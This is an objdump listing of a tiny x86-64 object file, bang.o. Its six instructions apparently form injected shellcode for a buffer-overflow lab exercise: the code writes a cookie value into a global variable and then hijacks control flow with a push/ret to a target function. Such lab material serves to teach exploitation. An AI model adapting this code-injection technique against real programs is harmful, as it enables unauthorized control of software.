
bang.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c0 08 23 60 00 	mov    $0x602308,%rax
   7:	48 be 68 a3 bf 49 8c 	movabs $0x4d79ae8c49bfa368,%rsi
   e:	ae 79 4d 
  11:	48 89 30             	mov    %rsi,(%rax)
  14:	68 20 10 40 00       	push   $0x401020
  19:	c3                   	ret
